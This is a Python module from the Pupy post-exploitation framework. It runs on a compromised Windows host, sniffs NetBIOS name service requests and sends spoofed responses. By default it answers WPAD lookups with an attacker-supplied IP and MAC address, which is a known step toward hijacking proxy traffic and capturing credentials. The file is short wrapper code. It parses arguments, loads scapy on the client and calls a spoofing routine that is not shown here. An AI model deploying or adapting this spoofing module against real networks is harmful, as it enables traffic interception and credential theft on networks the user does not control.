# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from modules.lib.windows.winpcap import init_winpcap
from pupylib.utils.rpyc_utils import redirected_stdo

from pupylib.PupyModule import (
    config, PupyModule,
    QA_DANGEROUS, PupyArgumentParser,
    REQUIRE_STREAM
)

__class_name__="NbnsSpoofModule"

@config(cat="network", tags=["netbios", "NBNS", "spoof"], compatibilities=['windows'])
class NbnsSpoofModule(PupyModule):
    """ sniff for NBNS requests and spoof NBNS responses """

    dependencies=['nbnsspoof']

    qa = QA_DANGEROUS
    io = REQUIRE_STREAM

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='nbnsspoof.py', description=cls.__doc__)
        cls.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
        cls.arg_parser.add_argument("--timeout", type=int, default=300, help="stop the spoofing after N seconds (default 300)")
        cls.arg_parser.add_argument("--regex", default=".*WPAD.*", help="only answer for requests matching the regex (default: .*WPAD.*)")
        cls.arg_parser.add_argument("srcmac", help="source mac address to use for the responses")
        cls.arg_parser.add_argument("ip", help="IP to spoof")


    def run(self, args):
        init_winpcap(self.client)
        # Load full scapy
        self.client.load_package('scapy', honor_ignore=False, force=True)

        with redirected_stdo(self):
            self.client.conn.modules['nbnsspoof'].start_nbnsspoof(
                args.ip, args.srcmac, timeout=args.timeout, verbose=True,
                interface=args.iface, name_regexp=args.regex)
